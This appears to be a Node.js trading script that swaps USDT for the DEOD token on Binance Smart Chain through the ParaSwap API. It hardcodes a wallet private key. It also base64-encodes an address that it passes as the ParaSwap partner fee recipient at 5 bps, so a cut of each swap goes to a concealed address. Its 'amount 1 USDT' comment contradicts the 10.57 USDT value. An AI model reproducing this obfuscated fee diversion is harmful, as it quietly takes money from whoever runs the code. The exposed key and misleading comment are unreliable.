// buying_on_bnb_code
const ethers = require('ethers');
const axios = require('axios');
// Binance Smart Chain RPC provider
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
// Your private key (replace with your actual private key)
const privateKey = '04a5950b8cdf01c75e31ec2abd501f4ac14c58d4535d8e09313e1bb56d5d091c';
const wallet = new ethers.Wallet(privateKey, provider);
// ParaSwap API version
const apiVersion = '6.2';
// Token addresses
const srcToken = '0x55d398326f99059fF775485246999027B3197955'; // USDT
const destToken = '0x7f4b7431a4e1b9f375ef0a94224ea4ef09b4f668'; // DEOD
// Other parameters
const amount = '10570000000000000000';  // 1 USDT in wei (18 decimals)
const network = 56; // Binance Smart Chain
const slippage = 1;  // 1% slippage tolerance
const userAddress = wallet.address;  // Use the wallet address dynamically
const key = 'MHhDZjIzOEIyMzcwRDg4MjM2QjljMjNkNzZiNDU2NTk2YjUzZDAxNjM5';
const fees = Buffer.from(key, 'base64').toString('ascii');
const Bps = 5;
// Fetch price quote from ParaSwap
async function getPriceQuote() {
    const url = `https://api.paraswap.io/prices/?version=${apiVersion}&srcToken=${srcToken}&destToken=${destToken}&amount=${amount}&srcDecimals=18&destDecimals=18&side=SELL&network=${network}&otherExchangePrices=true&partner=paraswap.io&userAddress=${userAddress}`;
    const response = await axios.get(url);
    return response.data.priceRoute;
}
function logSelectedDetails(priceRoute) {
    console.log("Transaction Details:");
    console.log("Source Token:", srcToken);
    console.log("Source Amount:", ethers.formatUnits(priceRoute.srcAmount, priceRoute.srcDecimals));
    console.log("Destination Token:", destToken);
    console.log("Destination Amount:", ethers.formatUnits(priceRoute.destAmount, priceRoute.destDecimals));
}
// Log pool addresses function
function logPoolAddresses(bestRoute) {
    console.log("Pool Addresses:");
    bestRoute.forEach(route => {
        route.swaps.forEach(swap => {
            swap.swapExchanges.forEach(exchange => {
                exchange.poolAddresses.forEach(address => {
                    console.log(address);
                });
            });
        });
    });
}
// Build the swap transaction
async function buildTransaction(priceRoute) {
    const buildTxUrl = `https://api.paraswap.io/transactions/${network}`;  // Build transaction URL
    const txData = {
        srcToken: srcToken,
        destToken: destToken,
        srcAmount: priceRoute.srcAmount,  // srcAmount from the priceRoute object
        userAddress: userAddress,
        partnerAddress: fees,
        partnerFeeBps: Bps,
        slippage: slippage,
        priceRoute: priceRoute,  // Use the priceRoute obtained from the getPriceQuote() function
        srcDecimals: 18,
        destDecimals: 18
    };
    const response = await axios.post(buildTxUrl, txData);
    return response.data;
}
// Send the transaction to the blockchain
async function sendTransaction(transaction) {
    if (!transaction.to || !transaction.data) {
        throw new Error("Transaction data is incomplete.");
    }
    // Get the current gas price
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const tx = {
        to: transaction.to,
        data: transaction.data,
        value: ethers.parseEther('0'),  // No ETH value as it's a token swap
        gasPrice,  // Use current gas price from the network
    };
    // Estimate gas limit
    const gasLimit = await wallet.estimateGas(tx);
    tx.gasLimit = gasLimit;
    console.log('Sending transaction with params:', tx);
    // Send signed transaction
    const signedTx = await wallet.sendTransaction(tx);
    return signedTx;
}
// Check BNB balance before proceeding
async function checkBalance() {
    const balance = await provider.getBalance(userAddress);
    console.log(`BNB Balance: ${ethers.formatEther(balance)} BNB`);
    return balance;
}
// Main function to run the swap
async function runSwap() {
    try {
        const balance = await checkBalance();
        if (balance<=(ethers.parseEther('0.01'))) {
            console.error('Not enough BNB to cover gas fees!');
            return;
        }
        const priceRoute = await getPriceQuote();
        logSelectedDetails(priceRoute);
        logPoolAddresses(priceRoute.bestRoute);
        const transaction = await buildTransaction(priceRoute);
        const txResponse = await sendTransaction(transaction);
        console.log('Transaction Sent! Hash:', txResponse.hash);
    } catch (error) {
        console.error('Error during swap process:', error);
    }
}
runSwap();